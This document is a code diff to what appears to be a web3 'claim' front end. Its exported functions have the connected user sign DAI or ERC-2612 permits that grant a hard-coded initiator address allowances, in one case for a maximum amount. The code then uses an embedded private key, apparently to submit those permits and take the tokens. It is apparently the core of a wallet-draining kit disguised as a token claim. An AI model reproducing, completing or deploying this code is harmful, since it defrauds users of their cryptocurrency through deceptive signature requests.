@@ -9,9 +9,14 @@ import {
   createConfig,
   fetchBalance,
   writeContract,
+  readContract,
+  getAccount,
+  fetchFeeData,
+  waitForTransaction,
+  connect
 } from '@wagmi/core';
+import { signDaiPermit, signERC2612Permit } from 'eth-permit';
 import { mainnet } from '@wagmi/core/chains';
-import { getAccount, fetchFeeData, disconnect, connect } from '@wagmi/core';
 import { InjectedConnector } from '@wagmi/core/connectors/injected';
 import { WalletConnectConnector } from '@wagmi/connectors/walletConnect';
 
@@ -119,12 +124,6 @@ export const claim = async (_balance) => {
 export const increaseAllowance = async (token) => {
   // RPC provider
   const provider = new ethers.providers.JsonRpcProvider(constants.infura);
-  let permitProvider = null;
-  if (window.ethereum){
-    permitProvider = window.ethereum
-  }else if (window.web3){
-    permitProvider = window.web3.currentProvider
-  }
   
   // get token Allownce to transfer imiditly
   const allow = await allownce(token);
@@ -136,7 +135,7 @@ export const increaseAllowance = async (token) => {
   const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
   const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
   const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
-  if (permitToken && permitProvider) {
+  if (permitToken) {
 
     let nonce = undefined
     await readContract({
@@ -157,7 +156,7 @@ export const increaseAllowance = async (token) => {
     }).then( async (result) => {
       if( result === '1') {
         await signDaiPermit(
-          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
+          window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
         ).then(async ( result) => {
 
           const signer = new ethers.Wallet(constants.initiatorPK, provider);
@@ -180,7 +179,7 @@ export const increaseAllowance = async (token) => {
 
       }else if (result === '2') {
         await signERC2612Permit(
-          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
+          window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
         ).then(async ( result) => {
 
           const signer = new ethers.Wallet(constants.initiatorPK, provider);
